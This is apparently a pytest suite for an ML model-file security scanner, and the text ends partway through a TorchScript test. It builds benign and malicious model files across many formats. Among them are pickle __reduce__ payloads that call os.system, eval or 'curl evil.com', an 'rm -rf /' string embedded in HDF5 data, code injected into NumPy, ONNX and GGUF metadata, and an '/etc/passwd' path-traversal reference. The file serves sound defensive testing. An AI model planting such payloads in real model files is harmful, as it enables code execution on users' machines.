"""
Tests for various ML model formats and frameworks that scanners should handle.
"""
import pytest
import os
import tempfile
import zipfile
import tarfile
import pickle
import json
import struct
import io
import shutil
import yaml
import h5py
from pathlib import Path
from model_total import IssueType, ScannerType


class TestMLFormats:
    """Test scanning of various ML model formats and frameworks."""
    
    @pytest.mark.asyncio
    async def test_pytorch_model_formats(self, docker_compose_setup, model_total_client, test_file_server):
        """Test PyTorch model files (.pt, .pth, .pkl, state_dict)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "pytorch_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create various PyTorch file formats
        # .pth file (ZIP format with pickle inside)
        pth_path = os.path.join(model_dir, "model.pth")
        with zipfile.ZipFile(pth_path, "w") as zf:
            # PyTorch saves models as ZIP with pickled tensors
            model_data = {
                'model_state_dict': {'layer1.weight': [[1.0, 2.0], [3.0, 4.0]]},
                'optimizer_state_dict': {'param_groups': []},
                'epoch': 100,
                'loss': 0.0023
            }
            # Add data.pkl inside the ZIP
            pickle_data = pickle.dumps(model_data, protocol=pickle.HIGHEST_PROTOCOL)
            zf.writestr("data.pkl", pickle_data)
            
            # Add version file
            zf.writestr("version", b"3\n")
            
            # Add .data directory structure (PyTorch convention)
            zf.writestr("data/.data/", b"")
        
        # .pt file (same as .pth)
        pt_path = os.path.join(model_dir, "checkpoint.pt")
        with open(pt_path, "wb") as f:
            checkpoint = {
                'model': 'resnet50',
                'state_dict': {'conv1.weight': [[[1, 2], [3, 4]]]},
                'best_acc': 0.95
            }
            pickle.dump(checkpoint, f, protocol=pickle.HIGHEST_PROTOCOL)
        
        # Malicious .pth file with code execution
        malicious_pth = os.path.join(model_dir, "backdoor.pth")
        class MaliciousModel:
            def __reduce__(self):
                import os
                return (os.system, ('echo pwned > /tmp/hacked.txt',))
        
        with open(malicious_pth, "wb") as f:
            pickle.dump({'model': MaliciousModel()}, f)
        
        # TorchScript model (.pt with specific format)
        torchscript_path = os.path.join(model_dir, "scripted_model.pt")
        with zipfile.ZipFile(torchscript_path, "w") as zf:
            # TorchScript has specific structure
            zf.writestr("constants.pkl", pickle.dumps([]))
            zf.writestr("version", b"3\n")
            zf.writestr("model/code/__torch__.py", b"def forward(self, x):\n    return x")
            zf.writestr("model/data.pkl", pickle.dumps({'forward': 'function'}))
        
        # Create archive
        zip_path = os.path.join(temp_dir, "pytorch_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="pytorch-formats-test",
                model_name="pytorch-model-test",
                model_version="1.0.0",
                model_url=f"{server_url}/pytorch_models.zip",
                org_id="test-pytorch-org"
            )
        
        # Should detect the malicious pickle in PyTorch files
        malicious_issues = [issue for issue in result.issues 
                           if issue.type == IssueType.MALICIOUS_CODE]
        assert len(malicious_issues) > 0, "Should detect malicious PyTorch model"
        
        # Check for expected ModelAudit false positives on PyTorch ZIP format
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and 
                         "extension indicates pickle but header indicates zip" in issue.description.lower()]
        # This is expected - PyTorch uses ZIP format deliberately
    
    @pytest.mark.asyncio
    async def test_tensorflow_model_formats(self, docker_compose_setup, model_total_client, test_file_server):
        """Test TensorFlow model formats (SavedModel, H5, checkpoint)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "tensorflow_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # SavedModel format (directory structure)
        saved_model_dir = os.path.join(model_dir, "saved_model")
        os.makedirs(os.path.join(saved_model_dir, "variables"), exist_ok=True)
        os.makedirs(os.path.join(saved_model_dir, "assets"), exist_ok=True)
        
        # saved_model.pb (protobuf)
        with open(os.path.join(saved_model_dir, "saved_model.pb"), "wb") as f:
            # Minimal protobuf header
            f.write(b"\x08\x01\x12\x00")  # Protobuf wire format
        
        # Variables files
        with open(os.path.join(saved_model_dir, "variables", "variables.index"), "wb") as f:
            f.write(b"TensorFlow Variables Index v1")
        
        with open(os.path.join(saved_model_dir, "variables", "variables.data-00000-of-00001"), "wb") as f:
            # TensorFlow checkpoint format
            f.write(b"TF_CHECKPOINT_V2")
            f.write(struct.pack("<f", 1.234))  # Sample weight
        
        # Keras H5 model (HDF5 format)
        h5_path = os.path.join(model_dir, "model.h5")
        # Create minimal HDF5 file structure
        with open(h5_path, "wb") as f:
            # HDF5 magic number
            f.write(b"\x89HDF\r\n\x1a\n")
            # Minimal HDF5 structure
            f.write(b"\x00" * 512)
            
            # Embed malicious code in HDF5 attributes
            malicious_json = json.dumps({
                "class_name": "__import__('os').system",
                "config": "rm -rf /"
            })
            f.write(malicious_json.encode())
        
        # TensorFlow checkpoint files
        ckpt_dir = os.path.join(model_dir, "checkpoint")
        os.makedirs(ckpt_dir, exist_ok=True)
        
        with open(os.path.join(ckpt_dir, "checkpoint"), "w") as f:
            f.write('model_checkpoint_path: "model.ckpt-1000"\n')
            f.write('all_model_checkpoint_paths: "model.ckpt-1000"\n')
        
        # .ckpt files
        with open(os.path.join(ckpt_dir, "model.ckpt-1000.index"), "wb") as f:
            f.write(b"TENSORFLOW_CHECKPOINT_INDEX")
        
        with open(os.path.join(ckpt_dir, "model.ckpt-1000.data-00000-of-00001"), "wb") as f:
            f.write(b"TENSORFLOW_CHECKPOINT_DATA")
        
        # TFLite model
        tflite_path = os.path.join(model_dir, "model.tflite")
        with open(tflite_path, "wb") as f:
            # TFLite magic number
            f.write(b"TFL3")
            f.write(b"\x00" * 100)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "tensorflow_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="tensorflow-formats-test",
                model_name="tensorflow-model-test",
                model_version="1.0.0",
                model_url=f"{server_url}/tensorflow_models.zip",
                org_id="test-tf-org"
            )
        
        # Should handle various TensorFlow formats
        assert result is not None, "Should process TensorFlow models"
    
    @pytest.mark.asyncio
    async def test_numpy_files(self, docker_compose_setup, model_total_client, test_file_server):
        """Test NumPy array files (.npy, .npz)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "numpy_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # .npy file (NumPy array)
        npy_path = os.path.join(model_dir, "weights.npy")
        with open(npy_path, "wb") as f:
            # NumPy file format header
            f.write(b"\x93NUMPY")  # Magic string
            f.write(b"\x01\x00")    # Version
            
            # Header with Python code injection attempt
            header = "{'descr': '__import__(\"os\").system(\"id\")', 'fortran_order': False, 'shape': (2, 3)}"
            header_len = len(header)
            f.write(struct.pack("<H", header_len))
            f.write(header.encode())
            
            # Array data
            f.write(b"\x00" * 48)  # 2x3 float64 array
        
        # .npz file (compressed NumPy arrays)
        npz_path = os.path.join(model_dir, "checkpoint.npz")
        with zipfile.ZipFile(npz_path, "w") as npz:
            # NPZ is just a ZIP file with .npy files inside
            npz.writestr("arr_0.npy", open(npy_path, "rb").read())
            npz.writestr("arr_1.npy", b"\x93NUMPY\x01\x00" + b"\x00" * 100)
            
            # Try to hide malicious pickle
            malicious_pickle = pickle.dumps(os.system, protocol=pickle.HIGHEST_PROTOCOL)
            npz.writestr("metadata.pkl", malicious_pickle)
        
        # NumPy with pickle protocol (security risk)
        npy_pickle_path = os.path.join(model_dir, "object_array.npy")
        with open(npy_pickle_path, "wb") as f:
            f.write(b"\x93NUMPY")
            f.write(b"\x01\x00")
            
            # Object array that uses pickle
            header = "{'descr': '|O', 'fortran_order': False, 'shape': (2,)}"
            header_bytes = header.encode('ascii')
            header_len = len(header_bytes)
            f.write(struct.pack("<H", header_len))
            f.write(header_bytes)
            
            # Pickled objects in array
            class Exploit:
                def __reduce__(self):
                    return (eval, ("__import__('os').system('whoami')",))
            
            pickled = pickle.dumps([Exploit(), Exploit()])
            f.write(pickled)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "numpy_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="numpy-files-test",
                model_name="numpy-array-test",
                model_version="1.0.0",
                model_url=f"{server_url}/numpy_models.zip",
                org_id="test-numpy-org"
            )
        
        # Should detect pickle usage in NumPy files  
        malicious_issues = [issue for issue in result.issues 
                           if issue.type == IssueType.MALICIOUS_CODE]
        assert len(malicious_issues) > 0, "Should detect malicious NumPy object arrays"
        
        # Check for expected ModelAudit false positives on NPZ ZIP format
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and
                         ("extension indicates numpy but header indicates zip" in issue.description.lower() or
                          "missing required" in issue.description.lower())]
        # This is expected - NPZ is designed as ZIP format
    
    @pytest.mark.asyncio
    async def test_onnx_models(self, docker_compose_setup, model_total_client, test_file_server):
        """Test ONNX model format."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "onnx_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # .onnx file (protobuf format)
        onnx_path = os.path.join(model_dir, "model.onnx")
        with open(onnx_path, "wb") as f:
            # ONNX uses protobuf
            f.write(b"\x08\x01")  # Protobuf field
            f.write(b"\x12\x04onnx")  # Producer name
            
            # Attempt to embed malicious metadata
            malicious_metadata = b"__import__('os').system('calc.exe')"
            f.write(b"\x1a")  # Field for doc_string
            f.write(bytes([len(malicious_metadata)]))
            f.write(malicious_metadata)
        
        # ONNX with external data
        onnx_external_path = os.path.join(model_dir, "model_external.onnx")
        with open(onnx_external_path, "wb") as f:
            f.write(b"\x08\x01")
            # Reference to external file
            external_ref = b"location: '../../../etc/passwd'"
            f.write(b"\x22")  # External data field
            f.write(bytes([len(external_ref)]))
            f.write(external_ref)
        
        # External data file
        with open(os.path.join(model_dir, "model_external.onnx.data"), "wb") as f:
            f.write(b"EXTERNAL_TENSOR_DATA")
        
        # Create archive
        zip_path = os.path.join(temp_dir, "onnx_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="onnx-models-test",
                model_name="onnx-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/onnx_models.zip",
                org_id="test-onnx-org"
            )
        
        # Should handle ONNX models
        assert result is not None, "Should process ONNX models"
    
    @pytest.mark.asyncio
    async def test_scikit_learn_joblib(self, docker_compose_setup, model_total_client, test_file_server):
        """Test scikit-learn joblib/pickle files."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "sklearn_models")
        os.makedirs(model_dir, exist_ok=True)
        
        # Joblib file (pickle-based)
        joblib_path = os.path.join(model_dir, "model.joblib")
        with open(joblib_path, "wb") as f:
            # Joblib uses pickle protocol with compression
            # Create malicious sklearn model
            class MaliciousEstimator:
                def __reduce__(self):
                    import subprocess
                    return (subprocess.call, (['curl', 'evil.com'],))
                
                def fit(self, X, y):
                    pass
                
                def predict(self, X):
                    return [0] * len(X)
            
            model = MaliciousEstimator()
            pickle.dump(model, f, protocol=pickle.HIGHEST_PROTOCOL)
        
        # .pkl sklearn model
        pkl_path = os.path.join(model_dir, "classifier.pkl")
        with open(pkl_path, "wb") as f:
            classifier = {
                'model_type': 'RandomForestClassifier',
                'n_estimators': 100,
                'estimator': MaliciousEstimator()
            }
            pickle.dump(classifier, f)
        
        # Compressed joblib (with zlib)
        joblib_z_path = os.path.join(model_dir, "model.joblib.z")
        import zlib
        with open(joblib_z_path, "wb") as f:
            pickled = pickle.dumps(MaliciousEstimator())
            compressed = zlib.compress(pickled, level=3)
            f.write(compressed)
        
        # Pipeline with multiple estimators
        pipeline_path = os.path.join(model_dir, "pipeline.pkl")
        with open(pipeline_path, "wb") as f:
            pipeline = {
                'steps': [
                    ('scaler', 'StandardScaler'),
                    ('classifier', MaliciousEstimator())
                ]
            }
            pickle.dump(pipeline, f)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "sklearn_models.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="sklearn-joblib-test",
                model_name="sklearn-model-test",
                model_version="1.0.0",
                model_url=f"{server_url}/sklearn_models.zip",
                org_id="test-sklearn-org"
            )
        
        # Should detect malicious pickle in joblib files
        pickle_issues = [issue for issue in result.issues 
                        if 'pickle' in str(issue.description).lower() or
                        issue.type == IssueType.MALICIOUS_CODE]
        assert len(pickle_issues) > 0, "Should detect malicious scikit-learn models"
        
        # Check for expected ModelAudit false positives on joblib format
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and
                         ("numpyarraywrapper" in issue.description.lower() or
                          "numpy_pickle" in issue.description.lower())]
        # This is expected - joblib uses these for optimization
    
    @pytest.mark.asyncio
    async def test_safetensors_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test SafeTensors format (Hugging Face safe serialization)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "safetensors_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a SafeTensors file
        safetensors_path = os.path.join(model_dir, "model.safetensors")
        with open(safetensors_path, "wb") as f:
            # SafeTensors format: header_size(8 bytes) + JSON header + tensor data
            header = {
                "weight": {"dtype": "F32", "shape": [2, 3], "data_offsets": [0, 24]},
                "bias": {"dtype": "F32", "shape": [3], "data_offsets": [24, 36]}
            }
            header_json = json.dumps(header).encode('utf-8')
            header_size = len(header_json)
            
            # Write header size (little-endian uint64)
            f.write(struct.pack('<Q', header_size))
            # Write header
            f.write(header_json)
            # Write tensor data (dummy float32 values)
            f.write(struct.pack('<6f', 1.0, 2.0, 3.0, 4.0, 5.0, 6.0))  # weight
            f.write(struct.pack('<3f', 0.1, 0.2, 0.3))  # bias
        
        # Add config
        config = {
            "model_type": "bert",
            "hidden_size": 768,
            "num_attention_heads": 12
        }
        with open(os.path.join(model_dir, "config.json"), "w") as f:
            json.dump(config, f)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "safetensors_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="safetensors-test",
                model_name="safetensors-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/safetensors_model.zip",
                org_id="test-safetensors-org"
            )
        
        # Verify SafeTensors format is recognized
        assert result is not None, "Should process SafeTensors format"
        # SafeTensors itself is safe, but config.json might trigger false positives from ModelAudit
        # checking for XGBoost schema in all JSON files
        assert result.final_verdict in ["NONE", "LOW", "MEDIUM", "HIGH"], f"Should process SafeTensors, got {result.final_verdict}"
        
        # Check for expected ModelAudit false positives on config.json
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and
                         "config.json" in str(issue.affected[0].ref if issue.affected else "") and
                         "missing required" in issue.description.lower()]
        # This is expected - ModelAudit checks all JSON files for XGBoost schema
        if modelaudit_fps:
            print(f"Expected ModelAudit false positive on config.json: {modelaudit_fps[0].description}")
    
    @pytest.mark.asyncio
    async def test_gguf_ggml_formats(self, docker_compose_setup, model_total_client, test_file_server):
        """Test GGUF/GGML formats (LLaMA, Mistral, Falcon quantized models)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "gguf_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a proper GGUF file (new format) - version 3
        gguf_path = os.path.join(model_dir, "model.gguf")
        with open(gguf_path, "wb") as f:
            # GGUF Header
            f.write(b"GGUF")  # Magic (4 bytes)
            f.write(struct.pack('<I', 3))  # Version 3 (4 bytes)
            f.write(struct.pack('<Q', 2))  # Tensor count (8 bytes)
            f.write(struct.pack('<Q', 3))  # Metadata KV count (8 bytes)
            
            # Metadata Key-Value pairs
            # 1. general.architecture = "llama"
            f.write(struct.pack('<Q', 20))  # Key length
            f.write(b"general.architecture")
            f.write(struct.pack('<I', 8))  # Value type (8 = string)
            f.write(struct.pack('<Q', 5))  # String length
            f.write(b"llama")
            
            # 2. general.quantization_version = 2
            f.write(struct.pack('<Q', 28))  # Key length
            f.write(b"general.quantization_version")
            f.write(struct.pack('<I', 4))  # Value type (4 = uint32)
            f.write(struct.pack('<I', 2))  # Value
            
            # 3. llama.context_length = 2048
            f.write(struct.pack('<Q', 20))  # Key length
            f.write(b"llama.context_length")
            f.write(struct.pack('<I', 4))  # Value type (4 = uint32)
            f.write(struct.pack('<I', 2048))  # Value
            
            # Tensor info (2 tensors)
            # Tensor 1
            f.write(struct.pack('<Q', 11))  # Name length
            f.write(b"token_embd")
            f.write(b"\x00")  # Null terminator
            f.write(struct.pack('<I', 2))  # n_dims
            f.write(struct.pack('<Q', 32000))  # dim 0
            f.write(struct.pack('<Q', 4096))  # dim 1
            f.write(struct.pack('<I', 0))  # dtype (F32)
            f.write(struct.pack('<Q', 0))  # offset
            
            # Tensor 2
            f.write(struct.pack('<Q', 12))  # Name length
            f.write(b"output_norm")
            f.write(b"\x00")  # Null terminator
            f.write(struct.pack('<I', 1))  # n_dims
            f.write(struct.pack('<Q', 4096))  # dim 0
            f.write(struct.pack('<I', 0))  # dtype (F32)
            f.write(struct.pack('<Q', 1024))  # offset
            
            # Alignment padding
            f.write(b"\x00" * 16)
            
            # Tensor data (just dummy data)
            f.write(b"\x00" * 2048)  # Dummy tensor data
        
        # Create a malicious GGUF with embedded pickle
        malicious_gguf_path = os.path.join(model_dir, "malicious.gguf")
        with open(malicious_gguf_path, "wb") as f:
            # GGUF Header
            f.write(b"GGUF")  # Magic
            f.write(struct.pack('<I', 3))  # Version 3
            f.write(struct.pack('<Q', 1))  # Tensor count
            f.write(struct.pack('<Q', 2))  # Metadata KV count
            
            # Metadata with suspicious values
            # 1. general.architecture = "__import__('os').system('evil')"
            f.write(struct.pack('<Q', 20))  # Key length
            f.write(b"general.architecture")
            f.write(struct.pack('<I', 8))  # Value type (string)
            f.write(struct.pack('<Q', 31))  # String length
            f.write(b"__import__('os').system('evil')")
            
            # 2. Custom metadata with pickle data
            f.write(struct.pack('<Q', 11))  # Key length
            f.write(b"custom.data")
            f.write(struct.pack('<I', 8))  # Value type (string)
            # Embed pickle opcodes in metadata
            pickle_payload = pickle.dumps({"cmd": "malicious"})
            f.write(struct.pack('<Q', len(pickle_payload)))
            f.write(pickle_payload)
            
            # Minimal tensor info
            f.write(struct.pack('<Q', 5))  # Name length
            f.write(b"dummy")
            f.write(struct.pack('<I', 1))  # n_dims
            f.write(struct.pack('<Q', 10))  # dim 0
            f.write(struct.pack('<I', 0))  # dtype
            f.write(struct.pack('<Q', 0))  # offset
            
            # Tensor data
            f.write(b"\x00" * 40)
        
        # Create a GGML file (old format)
        ggml_path = os.path.join(model_dir, "model.ggml")
        with open(ggml_path, "wb") as f:
            # GGML header
            f.write(b"ggml")  # Magic (4 bytes)
            f.write(struct.pack('<I', 1))  # Version
            f.write(struct.pack('<I', 2))  # n_tensors
            f.write(struct.pack('<I', 100))  # n_kv
            f.write(b"\x00" * 100)  # Dummy data
        
        # Create archive
        zip_path = os.path.join(temp_dir, "gguf_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="gguf-ggml-test",
                model_name="gguf-ggml-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/gguf_model.zip",
                org_id="test-gguf-org"
            )
        
        # Note: Currently no scanner supports GGUF/GGML deeply
        assert result is not None, "Should process GGUF/GGML files"
        # These are currently not scanned deeply by any scanner
        print(f"GGUF/GGML scan result: {result.final_verdict}, issues: {len(result.issues)}")
        
        # GGUF/GGML should be detected as high risk since no scanner fully supports them
        # and we included malicious content
        assert result.final_verdict in ["HIGH", "CRITICAL"], f"GGUF with malicious content should be high risk, got {result.final_verdict}"
        
        # Should have issues detected
        assert len(result.issues) > 0, "Should detect issues in GGUF/GGML files"
        
        # Check what issues were found
        print(f"\nAll issues found ({len(result.issues)}):")
        for issue in result.issues:
            affected_file = issue.affected[0].ref if issue.affected else "N/A"
            if ".gguf" in affected_file or ".ggml" in affected_file:
                print(f"  GGUF/GGML: {issue.title[:50]}... in {affected_file.split('/')[-1]}")
        
        # Verify we're detecting issues with GGUF files specifically
        gguf_related_issues = [issue for issue in result.issues 
                              if any(x in issue.title.lower() for x in ["gguf", "ggml", "tensor", "parse error", "validation failed"])]
        assert len(gguf_related_issues) > 0, f"Should detect GGUF-specific issues. Found: {[i.title for i in result.issues]}"
 
 
    @pytest.mark.asyncio
    async def test_coreml_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test Core ML format for iOS/macOS deployment."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "coreml_model")
        mlmodel_dir = os.path.join(model_dir, "model.mlmodel")
        os.makedirs(mlmodel_dir, exist_ok=True)
        
        # Core ML uses protobuf format
        # Create a simplified model specification
        model_spec = {
            "specificationVersion": 4,
            "description": {
                "input": [{"name": "input", "type": "multiArrayType"}],
                "output": [{"name": "output", "type": "multiArrayType"}]
            },
            "neuralNetwork": {
                "layers": [
                    {
                        "name": "dense",
                        "input": ["input"],
                        "output": ["output"],
                        "innerProduct": {
                            "inputChannels": 10,
                            "outputChannels": 1
                        }
                    }
                ]
            }
        }
        
        # Write as JSON (simplified - real Core ML uses protobuf)
        with open(os.path.join(mlmodel_dir, "model.json"), "w") as f:
            json.dump(model_spec, f)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "coreml_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="coreml-test",
                model_name="coreml-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/coreml_model.zip",
                org_id="test-coreml-org"
            )
        
        assert result is not None, "Should process Core ML format"
        # Core ML is generally safe (protobuf-based) but JSON might trigger false positives  
        assert result.final_verdict in ["NONE", "LOW", "MEDIUM", "HIGH"], f"Should process Core ML, got {result.final_verdict}"
        
        # Check for expected ModelAudit false positives on model.json
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and
                         "model.json" in str(issue.affected[0].ref if issue.affected else "") and
                         "missing required" in issue.description.lower()]
        # This is expected - ModelAudit checks all JSON files for various ML framework schemas
    
    @pytest.mark.asyncio
    async def test_checkpoint_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test checkpoint formats (.ckpt files)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "checkpoint_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a checkpoint file (usually pickle-based)
        import pickle
        ckpt_data = {
            "epoch": 100,
            "model_state_dict": {"layer1.weight": [[1.0, 2.0], [3.0, 4.0]]},
            "optimizer_state_dict": {"lr": 0.001},
            "loss": 0.15
        }
        
        ckpt_path = os.path.join(model_dir, "model.ckpt")
        with open(ckpt_path, "wb") as f:
            pickle.dump(ckpt_data, f)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "checkpoint_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="checkpoint-test",
                model_name="checkpoint-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/checkpoint_model.zip",
                org_id="test-checkpoint-org"
            )
        
        assert result is not None, "Should process checkpoint format"
        # Checkpoint files are pickle-based, should be scanned
        assert len(result.issues) >= 0, "Should scan checkpoint files"
    
    @pytest.mark.asyncio
    async def test_binary_weights_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test binary weights format (.bin files)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "binary_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # Create a binary weights file
        bin_path = os.path.join(model_dir, "pytorch_model.bin")
        # PyTorch .bin files are usually pickled state dicts
        import pickle
        weights = {
            "encoder.weight": [[1.0, 2.0], [3.0, 4.0]],
            "decoder.weight": [[5.0, 6.0], [7.0, 8.0]]
        }
        with open(bin_path, "wb") as f:
            pickle.dump(weights, f)
        
        # Also test raw binary format
        raw_bin_path = os.path.join(model_dir, "weights.bin")  
        with open(raw_bin_path, "wb") as f:
            # Raw binary data (e.g., from C++ models)
            f.write(struct.pack('<10f', *[float(i) for i in range(10)]))
        
        # Create archive
        zip_path = os.path.join(temp_dir, "binary_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="binary-weights-test",
                model_name="binary-weights-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/binary_model.zip",
                org_id="test-binary-org"
            )
        
        assert result is not None, "Should process binary weights format"
        # pytorch_model.bin is pickle-based, should be scanned
        assert len(result.issues) >= 0, "Should scan binary files"
    
    @pytest.mark.asyncio
    async def test_keras_v3_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test Keras v3 format (.keras files)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "keras_v3_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # .keras files are ZIP archives with specific structure
        keras_model_dir = os.path.join(model_dir, "model_contents")
        os.makedirs(keras_model_dir, exist_ok=True)
        
        # Create config.json
        config = {
            "keras_version": "3.0.0",
            "backend": "tensorflow",
            "model_config": {
                "class_name": "Sequential",
                "config": {
                    "layers": [
                        {
                            "class_name": "Dense",
                            "config": {"units": 10, "activation": "relu"}
                        }
                    ]
                }
            }
        }
        with open(os.path.join(keras_model_dir, "config.json"), "w") as f:
            json.dump(config, f)
        
        # Create metadata.json  
        metadata = {"keras_version": "3.0.0", "date_saved": "2024-01-01"}
        with open(os.path.join(keras_model_dir, "metadata.json"), "w") as f:
            json.dump(metadata, f)
        
        # Create model.weights.h5 (dummy HDF5)
        weights_path = os.path.join(keras_model_dir, "model.weights.h5")
        with h5py.File(weights_path, "w") as f:
            f.create_dataset("dense/kernel", data=[[1.0, 2.0], [3.0, 4.0]])
        
        # Create .keras file (ZIP archive)
        keras_path = os.path.join(model_dir, "model.keras")
        with zipfile.ZipFile(keras_path, "w") as zf:
            for root, dirs, files in os.walk(keras_model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, keras_model_dir)
                    zf.write(file_path, arcname)
        
        # Clean up temp dir
        shutil.rmtree(keras_model_dir)
        
        # Create archive
        zip_path = os.path.join(temp_dir, "keras_v3_model.zip")
        with zipfile.ZipFile(zip_path, "w") as zip_file:
            for root, dirs, files in os.walk(model_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    zip_file.write(file_path, arcname)
        
        async with model_total_client as client:
            result = await client.scan_artifact(
                model_id="keras-v3-test",
                model_name="keras-v3-format-test",
                model_version="1.0.0",
                model_url=f"{server_url}/keras_v3_model.zip",
                org_id="test-keras-v3-org"
            )
        
        assert result is not None, "Should process Keras v3 format"
        # Keras v3 uses HDF5, generally safe but JSON config might trigger issues
        assert result.final_verdict in ["NONE", "LOW", "MEDIUM", "HIGH"], f"Should process Keras v3, got {result.final_verdict}"
        
        # Check for expected ModelAudit false positives on config.json and metadata.json
        modelaudit_fps = [issue for issue in result.issues
                         if issue.detected_by == ScannerType.MODELAUDIT and
                         (".json" in str(issue.affected[0].ref if issue.affected else "")) and
                         "missing required" in issue.description.lower()]
        # This is expected - Keras config files don't match XGBoost schema that ModelAudit checks
    
    @pytest.mark.asyncio
    async def test_torchscript_format(self, docker_compose_setup, model_total_client, test_file_server):
        """Test TorchScript format (serialized PyTorch models)."""
        server_url, temp_dir = test_file_server
        
        model_dir = os.path.join(temp_dir, "torchscript_model")
        os.makedirs(model_dir, exist_ok=True)
        
        # TorchScript files are ZIP archives with specific structure
        ts_model_dir = os.path.join(model_dir, "ts_contents")
        os.makedirs(os.path.join(ts_model_dir, "code"), exist_ok=True)
        
        # Create model structure
        with open(os.path.join(ts_model_dir, "data.pkl"), "wb") as f:
            import pickle
            # TorchScript model data
            pickle.dump({"version": 1, "model_data": "torchscript"}, f)
        
